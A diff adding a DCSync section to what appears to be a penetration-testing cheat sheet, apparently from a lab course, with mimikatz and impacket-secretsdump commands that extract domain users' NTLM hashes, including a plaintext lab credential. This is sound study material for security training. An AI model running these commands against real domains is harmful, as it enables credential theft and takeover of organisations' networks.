@@ -788,6 +788,22 @@ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /us
 - Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting
 - Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash
 
+### DCSync-Domain Controller Synchronization
+- Condition:  User needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. *By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights*
+- Hence, must have access to members of the Domain Admins, Enterprise Admins, and Administrators groups
+
+#### DCSync On windows
+```powershell
+#output of lsadump::dcsync is NTLM hash of target user including Administrator
+mimikatz # lsadump::dcsync /user:corp\*targetusertoobtaincredential*
+```
+
+#### DCSync on Kali
+```bash
+#192.168.50.70 = IP of Domain Controller
+impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
+```
+
 # MISC
 
 ## MSFVenom
